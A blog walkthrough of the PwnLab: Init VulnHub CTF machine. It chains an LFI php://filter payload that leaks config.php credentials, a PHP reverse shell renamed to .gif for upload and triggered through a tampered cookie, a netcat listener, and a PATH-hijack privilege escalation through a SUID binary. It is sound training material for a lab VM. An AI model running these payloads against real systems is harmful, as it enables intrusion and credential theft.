---
title: "Pwning PwnLab: Init — A VulnHub CTF Walkthrough"
author: Illusivehacks
date: 2026-03-24 10:00:00 +0300
description: A complete step-by-step walkthrough of the PwnLab Init VulnHub machine — covering recon, LFI exploitation, file upload bypass, reverse shell and privilege escalation.
image: /assets/images/Fifth_blog/fifth_blog.jpg
categories: [Cybersecurity, CTF, VulnHub, Penetration Testing, Web Exploitation]
tags: [PwnLab, VulnHub, CTF, LFI, File Upload Bypass, Reverse Shell, MySQL, Burp Suite, Privilege Escalation, Kali Linux]
---

# Pwning PwnLab: Init — A VulnHub CTF Walkthrough

Welcome back, security enthusiasts! In today's lab we're tackling **PwnLab: Init** — a beginner-to-intermediate level Capture The Flag (CTF) machine from VulnHub. This box is a fantastic introduction to a chain of real-world web vulnerabilities including **Local File Inclusion (LFI)**, **file upload bypass**, **PHP reverse shells**, and **Linux privilege escalation**.

By the end of this walkthrough you'll have a solid understanding of how multiple vulnerabilities can be chained together to achieve full system compromise.

---

## What Are We Trying to Achieve?

### Q: What is PwnLab: Init?

**A:** PwnLab: Init is a deliberately vulnerable virtual machine hosted on VulnHub. It simulates a real-world web application with multiple security flaws. The goal is to exploit those flaws step by step — starting from an unauthenticated web visitor and ending with a root or elevated shell on the machine. It is designed for learning purposes and is a great exercise for anyone preparing for certifications like OSCP or CEH.

### Q: What do I need to run this lab?

**A:** You'll need:

- A **Kali Linux** VM as your attacker machine
- **VirtualBox** or **VMware** to import and run the PwnLab machine
- **Burp Suite**, **nmap**, **gobuster**, **nikto**, and **netcat** — all available by default on Kali
- **CyberChef** (browser-based) for decoding Base64
- Basic familiarity with Linux terminals and web browsers

---

## Lab Environment Setup

### Lab Objectives

- Identify and exploit a **Local File Inclusion (LFI)** vulnerability to leak database credentials
- Extract user credentials from a **MySQL** database
- Bypass file upload restrictions and upload a **PHP reverse shell**
- Use **Burp Suite** to manipulate requests and trigger shell execution
- Escalate privileges by exploiting a **SUID binary**

### Lab Duration

⏱ Estimated Time: **45–60 Minutes**

---

## Step-by-Step Walkthrough

### Step 1: Download and Import PwnLab: Init

Open your browser and navigate to the official VulnHub entry for PwnLab: Init:

```
https://www.vulnhub.com/entry/pwnlab-init,158/
```

Click the **Download (Mirror)** button to download the `.ova` or `.vmdk` file.

![Downloading PwnLab from VulnHub](/assets/images/Fifth_blog/image1.jpg)
*Download the PwnLab: Init machine from the VulnHub mirror.*

<p>
  <img src="/assets/images/Fifth_blog/image1.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>


Once downloaded, open **VirtualBox**, go to **File → Import Appliance**, and select the downloaded file. Click through the import wizard and finish the import.

![Importing PwnLab into VirtualBox](/assets/images/Fifth_blog/image2.jpg)
*Import the machine into VirtualBox using the Import Appliance option.*

<p>
  <img src="/assets/images/Fifth_blog/image2.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

![Import wizard finish screen](/assets/images/Fifth_blog/image3.jpg)
*Click Finish to complete the import and boot the machine.*

<p>
  <img src="/assets/images/Fifth_blog/image3.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

> **Tip:** Make sure both your Kali VM and the PwnLab machine are on the same **Host-Only** or **NAT Network** adapter in VirtualBox so they can communicate with each other.

---

### Step 2: Discover the Target IP with netdiscover

Boot both your **Kali Linux** VM and the **PwnLab** machine. Open a terminal in Kali and run `netdiscover` to identify the IP address assigned to PwnLab on your network:

```bash
sudo netdiscover -r 192.168.56.0/24
```

Look for a new IP that appears alongside the PwnLab machine's MAC address. In this lab, the target IP is `192.168.56.105`.

![netdiscover output showing the PwnLab IP](/assets/images/Fifth_blog/image4.jpg)
*netdiscover identifies the PwnLab machine at 192.168.56.105 on the local network.*

<p>
  <img src="/assets/images/Fifth_blog/image4.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

---

### Step 3: Run an Nmap Scan

Now perform a comprehensive **nmap** scan against the target to discover open ports and services:

```bash
nmap -sV -sC -p- 192.168.56.105
```

- `-sV` — Probe open ports to determine service and version info
- `-sC` — Run default nmap scripts
- `-p-` — Scan all 65535 ports

![nmap scan results for PwnLab](/assets/images/Fifth_blog/image5.jpg)
*nmap reveals three open ports: 80 (HTTP), 111 (RPC) and 3306 (MySQL).*

<p>
  <img src="/assets/images/Fifth_blog/image5.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

The scan reveals three open ports:

| Port | Service | Notes |
|------|---------|-------|
| 80 | HTTP | Web application — our primary target |
| 111 | RPC | Remote Procedure Call — likely not useful here |
| 3306 | MySQL | Database — potentially accessible with credentials |

Port 80 is the most interesting. Let's begin our web enumeration there.

---

### Step 4: Enumerate the Web Application

Open **Firefox** in Kali and navigate to the target's IP:

```
http://192.168.56.105
```

Browse through the pages. You'll find a basic web application with a **login page** and an **upload functionality** (once logged in).

![PwnLab home page](/assets/images/Fifth_blog/image6.jpg)
*The PwnLab web application home page.*

<p>
  <img src="/assets/images/Fifth_blog/image6.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

![PwnLab login page](/assets/images/Fifth_blog/image7.jpg)
*The login form at the root of the web application.*

<p>
  <img src="/assets/images/Fifth_blog/image7.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

![PwnLab upload page (restricted)](/assets/images/Fifth_blog/image8.jpg)
*Browsing through the application reveals an upload feature that requires authentication.*

<p>
  <img src="/assets/images/Fifth_blog/image8.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

---

### Step 5: Directory Brute-Force with Gobuster

Run **gobuster** to discover any hidden directories or files on the web server:

```bash
gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

- `dir` — Directory/file brute-force mode
- `-u` — Target URL
- `-w` — Wordlist path
- `-x` — File extensions to append to each guess

![Gobuster output](/assets/images/Fifth_blog/image9.jpg)
*Gobuster discovers some directories and PHP files, but nothing immediately exploitable.*

<p>
  <img src="/assets/images/Fifth_blog/image9.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

While gobuster doesn't uncover anything critically exploitable on its own, it does confirm the structure of the application — including `index.php` and other PHP pages we'll use later.

---

### Step 6: Nikto Scan — Discovering config.php

Run a **nikto** scan to look for misconfigurations, dangerous files, and default vulnerabilities:

```bash
nikto -h http://192.168.56.105
```

![Nikto scan output highlighting config.php](/assets/images/Fifth_blog/image10.jpg)
*Nikto flags config.php as a file of interest that may contain sensitive information.*

<p>
  <img src="/assets/images/Fifth_blog/image10.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

Nikto reveals the presence of a **config.php** file. Configuration files often contain database credentials stored in plaintext — making this a high-priority target.

---

### Step 7: Exploit LFI with PHP Filters to Read config.php

The web application uses a `?page=` parameter in its URL, which is a classic indicator of a **Local File Inclusion (LFI)** vulnerability. Direct inclusion of `config.php` would execute the file rather than display its contents, so we use a **PHP filter wrapper** to read it as Base64-encoded text.

We referenced this excellent cheatsheet for PHP filter payloads:

```
https://www.hackthebox.com/files/cheatsheet-file-inclusion.pdf
```

After testing several filters, the following payload successfully reads `config.php` as Base64:

```
http://192.168.56.105/?page=php://filter/convert.base64-encode/resource=config
```

Navigate to this URL in the browser. The page will render a long Base64-encoded string instead of a blank page or error.

![PHP filter returning Base64-encoded config.php](/assets/images/Fifth_blog/image11.jpg)
*The PHP filter wrapper returns the contents of config.php encoded in Base64.*

<p>
  <img src="/assets/images/Fifth_blog/image11.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

---

### Step 8: Decode the Base64 Output with CyberChef

Copy the entire Base64 string from the browser. Open **CyberChef** in a new tab:

```
https://gchq.github.io/CyberChef/
```

Paste the Base64 string into the **Input** field. In the **Operations** search bar, type `From Base64` and drag it into the **Recipe** column. The decoded output will appear in the **Output** panel, revealing the raw PHP source code of `config.php`.

![CyberChef decoding the Base64 config.php](/assets/images/Fifth_blog/image12.jpg)
*CyberChef decodes the Base64 string and reveals the database credentials inside config.php.*

<p>
  <img src="/assets/images/Fifth_blog/image12.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

The decoded `config.php` will look something like this:

```php
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

You now have **MySQL credentials**. Note them down carefully.

---

### Step 9: Log Into MySQL and Extract User Credentials

Open a terminal in Kali and connect to the MySQL service on the target using the credentials extracted from `config.php`:

```bash
mysql -u root -p -h 192.168.56.105
```

When prompted, enter the password (`H4u%QJ_H99` or whatever was in the decoded config). Once connected, enumerate the databases and tables:

```sql
show databases;
use Users;
show tables;
select * from users;
```

![MySQL login and database enumeration](/assets/images/Fifth_blog/image13.jpg)
*Logging into MySQL with the config.php credentials and enumerating the Users database.*

<p>
  <img src="/assets/images/Fifth_blog/image13.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

![Users table showing kent, mike and kane](/assets/images/Fifth_blog/image14.jpg)
*The users table reveals three accounts: kent, mike and kane — each with a Base64-encoded password.*

<p>
  <img src="/assets/images/Fifth_blog/image14.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

![User records with encoded passwords](/assets/images/Fifth_blog/image15.jpg)
*All three user records with their hashed/encoded passwords stored in the database.*

<p>
  <img src="/assets/images/Fifth_blog/image15.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

The table reveals three users: **kent**, **mike**, and **kane**, each with a Base64-encoded password. Decode each password using the terminal:

```bash
echo "ENCODED_PASSWORD_HERE" | base64 --decode
```

Run this for each of the three encoded passwords. You'll obtain cleartext passwords for all three accounts.

---

### Step 10: Log In to the Web Application

Use the decoded credentials to log in to the PwnLab web application through the browser. Start with **kent's** account. After a successful login, you'll be redirected to an upload page.

![PwnLab upload page after login](/assets/images/Fifth_blog/image16.jpg)
*After logging in as kent, we can access the upload functionality.*

<p>
  <img src="/assets/images/Fifth_blog/image16.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

Experiment with the upload form. The application only accepts **image file types** — specifically `.jpeg`, `.jpg`, `.gif`, and `.png`. Attempting to upload a `.php` file directly will be rejected.

![File type restriction on the upload form](/assets/images/Fifth_blog/image17.jpg)
*The uploader enforces MIME type and extension checks — only image formats are permitted.*

<p>
  <img src="/assets/images/Fifth_blog/image17.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>
---

### Step 11: Prepare a PHP Reverse Shell

We need to craft a PHP reverse shell payload and disguise it as a `.gif` image to bypass the upload filter.

In Kali, copy the default PHP reverse shell template:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
```

Open it in a text editor:

```bash
nano ~/shell.php
```

Locate these two lines and update them with your **Kali IP** and your chosen **listening port**:

```php
$ip = '192.168.56.XXX';   // Replace with your Kali IP
$port = 4444;              // Choose any unused port
```

Save and close the file.

![Editing the PHP reverse shell](/assets/images/Fifth_blog/image18.jpg)
*Setting the IP and port in the PHP reverse shell to point back to our Kali listener.*

<p>
  <img src="/assets/images/Fifth_blog/image18.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

Now rename the file with a `.gif` extension to pass the upload filter's extension check:

```bash
cp ~/shell.php ~/shell.gif
```

![shell.php renamed to shell.gif](/assets/images/Fifth_blog/image19.jpg)
*The reverse shell is renamed to shell.gif to spoof the file extension check.*

<p>
  <img src="/assets/images/Fifth_blog/image19.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

> **Important:** The file still contains PHP code — we are only renaming the extension. The server must be tricked into executing it as PHP despite the `.gif` extension, which we'll handle via Burp Suite in a later step.

---

### Step 12: Upload the Disguised Shell

Back in the browser, use kent's dashboard to upload `shell.gif`.

![Uploading shell.gif via the web form](/assets/images/Fifth_blog/image20.jpg)
*Uploading the disguised reverse shell through the file upload form.*

<p>
  <img src="/assets/images/Fifth_blog/image20.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

After uploading, the server should confirm a successful upload.

![Upload success confirmation](/assets/images/Fifth_blog/image21.jpg)
*The application confirms the file was uploaded successfully.*

<p>
  <img src="/assets/images/Fifth_blog/image21.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

To verify the upload, right-click the page and select **View Page Source**. Look for the uploaded file path — it will tell you exactly where on the server `shell.gif` was saved.

![Viewing page source to find upload path](/assets/images/Fifth_blog/image22.jpg)
*Inspecting the page source reveals the server-side path where our file was stored.*

<p>
  <img src="/assets/images/Fifth_blog/image22.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

The upload path will look something like:

```
/upload/HASH_shell.gif
```

Note this path down — you'll need it in the next step.

![Uploaded gif file listing](/assets/images/Fifth_blog/image23.jpg)
*The uploaded shell.gif file visible in the upload directory.*

<p>
  <img src="/assets/images/Fifth_blog/image23.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

---

### Step 13: Read index.php via PHP Filter to Understand File Inclusion

Before triggering the shell, we need to understand how the application includes files. Use the same PHP filter technique from Step 7 to read `index.php`:

```
http://192.168.56.105/?page=php://filter/read=convert.base64-encode/resource=index
```

![PHP filter on index.php](/assets/images/Fifth_blog/image24.jpg)
*Reading index.php via PHP filter to understand the page inclusion mechanism.*

<p>
  <img src="/assets/images/Fifth_blog/image24.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

Decode the output in CyberChef as before:

![CyberChef decoding index.php source](/assets/images/Fifth_blog/image25.jpg)
*The decoded index.php source reveals how the application handles the ?page= parameter and session-based language cookies.*

<p>
  <img src="/assets/images/Fifth_blog/image25.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

Examining the source reveals that the `?page=` parameter directly includes files, and the application uses a **cookie** to handle language preferences — this is our vector for triggering the uploaded shell.

---

### Step 14: Start a Netcat Listener

Before triggering the shell, set up a **netcat listener** on your Kali machine on the port you configured in the reverse shell (e.g., 4444):

```bash
nc -lvnp 4444
```

- `-l` — Listen mode
- `-v` — Verbose output
- `-n` — No DNS resolution (faster)
- `-p 4444` — Port to listen on

![Netcat listener ready on port 4444](/assets/images/Fifth_blog/image26.jpg)
*Netcat is now listening and ready to catch the incoming reverse shell connection.*

<p>
  <img src="/assets/images/Fifth_blog/image26.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

Leave this terminal open and switch back to Burp Suite.

---

### Step 15: Intercept and Modify the Request with Burp Suite

Open **Burp Suite** in Kali. Make sure your browser is configured to proxy through Burp (`127.0.0.1:8080`). Enable **Intercept** in the **Proxy** tab.

Now navigate to the uploaded file's URL in the browser — the path you noted in Step 12. This triggers the application to attempt to "display" the uploaded file:

```
http://192.168.56.105/?page=upload/HASH_shell
```

Burp Suite will intercept the request. In the **Proxy → Intercept** tab you'll see the raw HTTP request. Look for the **Cookie** header. The cookie controls how the server handles the page include.

Modify the cookie value to point to the upload path of your shell — effectively telling the server to include (and therefore **execute**) your PHP file:

![Burp Suite intercepted request with cookie modification](/assets/images/Fifth_blog/image27.jpg)
*The intercepted HTTP request in Burp Suite, showing the Cookie header we need to modify.*

<p>
  <img src="/assets/images/Fifth_blog/image27.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

![Modified request in Burp Suite](/assets/images/Fifth_blog/image28.jpg)
*After modifying the cookie to reference the uploaded shell path, we forward the request.*

<p>
  <img src="/assets/images/Fifth_blog/image28.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

Once you've made your changes, click **Forward** in Burp Suite to send the modified request to the server.

---

### Step 16: Catch the Reverse Shell

Switch back to your terminal running the netcat listener. If everything worked correctly, you should see an incoming connection — your reverse shell has landed!

![Reverse shell caught on netcat listener](/assets/images/Fifth_blog/image29.jpg)
*Netcat catches the reverse shell — we now have remote command execution on the PwnLab server.*

<p>
  <img src="/assets/images/Fifth_blog/image29.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

You are now executing commands on the PwnLab machine as the `www-data` user (the web server process user). Let's upgrade to a more stable shell.

First, check if Python is available:

```bash
which python
```

Then spawn a proper **PTY shell** using Python:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

This replaces the basic netcat shell with a fully interactive bash terminal — allowing you to use features like tab completion, `su`, and interactive prompts.

---

### Step 17: Enumerate Users on the System

Navigate to the `/home` directory to see what users exist on the machine:

```bash
cd /home
ls -la
```

![Home directory listing showing four users](/assets/images/Fifth_blog/image30.jpg)
*The /home directory reveals four users: kent, mike, kane and john.*

<p>
  <img src="/assets/images/Fifth_blog/image30.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

You can see four users: **kent**, **mike**, **kane**, and **john**. Let's investigate each.

---

### Step 18: Investigate Kent's Home Directory

Navigate to kent's home directory and list its contents:

```bash
cd /home/kent
ls -la
```

![Kent's home directory contents](/assets/images/Fifth_blog/image31.jpg)
*Kent's home directory contains nothing particularly useful for privilege escalation.*

<p>
  <img src="/assets/images/Fifth_blog/image31.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

Kent's directory doesn't contain anything immediately exploitable. Let's move on.

---

### Step 19: Investigate Kane's Home Directory — Finding a SUID Binary

Navigate to kane's home directory:

```bash
cd /home/kane
ls -la
```

![Kane's home directory showing the msgmike binary](/assets/images/Fifth_blog/image32.jpg)
*Kane's home directory contains a suspicious executable called msgmike.*

<p>
  <img src="/assets/images/Fifth_blog/image32.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

There's an interesting executable called **msgmike**. Check its permissions and ownership:

```bash
ls -la msgmike
file msgmike
```

The binary is owned by **mike** and has the **SUID bit set** — meaning it runs with mike's privileges, regardless of who executes it. This is our privilege escalation vector.

---

### Step 20: Exploit msgmike to Escalate to Mike

First, switch to kane's account using the password you decoded from MySQL earlier:

```bash
su kane
```

Now run the `msgmike` binary:

```bash
./msgmike
```

![Running msgmike as kane](/assets/images/Fifth_blog/image33.jpg)
*Running msgmike triggers an error — it's trying to call the `cat` command to read mike's messages.*

<p>
  <img src="/assets/images/Fifth_blog/image33.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

The binary appears to call `cat` internally to read a message file in mike's directory. Because the binary runs as **mike** (SUID), we can hijack the `cat` call by manipulating the **PATH** environment variable.

The trick is to create a **fake `cat`** in a directory that comes first in the PATH, so when `msgmike` calls `cat`, it runs our malicious version instead. Our fake `cat` will spawn a shell as mike:

```bash
cd /tmp
echo '/bin/bash' > cat
chmod +x cat
export PATH=/tmp:$PATH
```

Now run `msgmike` again:

```bash
/home/kane/msgmike
```

![Privilege escalation to mike via PATH hijacking](/assets/images/Fifth_blog/image34.jpg)
*Manipulating PATH causes msgmike to execute our fake cat, spawning a shell as mike.*

<p>
  <img src="/assets/images/Fifth_blog/image34.jpg" alt="Windows 11 lock screen inside VirtualBox" style="max-width:100%; border-radius:8px;">
</p>

You now have a shell running as **mike**. The privilege escalation chain is working — continue exploring mike's directory and looking for another SUID binary or credentials to escalate further toward root.

---

## Key Takeaways

In this walkthrough we successfully:

- **Discovered** the target with `netdiscover` and `nmap`
- **Enumerated** the web application using `gobuster` and `nikto`
- **Exploited LFI** using a PHP filter wrapper to leak `config.php` credentials
- **Accessed MySQL** directly and extracted three sets of user credentials
- **Bypassed file upload restrictions** by renaming a PHP shell to `.gif`
- **Used Burp Suite** to intercept and manipulate an HTTP request to trigger shell execution
- **Caught a reverse shell** via a netcat listener
- **Escalated privileges** from `www-data` → `kane` → `mike` using a SUID binary and PATH hijacking

PwnLab: Init is an excellent demonstration of how **chained vulnerabilities** — none of which alone grants full access — can combine to result in complete system compromise. This is exactly the mindset needed for real-world penetration testing.

---

> **Disclaimer:** The tools and techniques discussed in this guide are intended strictly for educational purposes and authorised security testing. Always ensure you have explicit legal permission before testing any system. Never attempt these techniques on systems you do not own or have written authorisation to test.
